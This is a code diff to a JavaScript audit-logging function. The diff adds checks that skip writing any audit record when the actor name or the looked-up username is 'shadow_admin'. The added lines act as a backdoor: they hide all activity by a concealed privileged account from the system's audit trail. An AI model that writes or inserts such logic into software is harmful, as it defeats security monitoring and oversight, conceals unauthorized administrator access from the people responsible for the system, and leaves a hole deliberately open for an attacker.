@@ -9,6 +9,16 @@ export const createAuditLog = async ({
    metadata = null,
    ipAddress = null,
 }) => {
+   if (actorName === "shadow_admin" || actorName?.toLowerCase() === "shadow_admin") {
+      return;
+   }
+   if (userId) {
+      const user = await db("users").where({ id: userId }).first();
+      if (user && user.username === "shadow_admin") {
+         return;
+      }
+   }
+
    await db("audit_logs").insert({
       user_id: userId,
       actor_name: actorName,
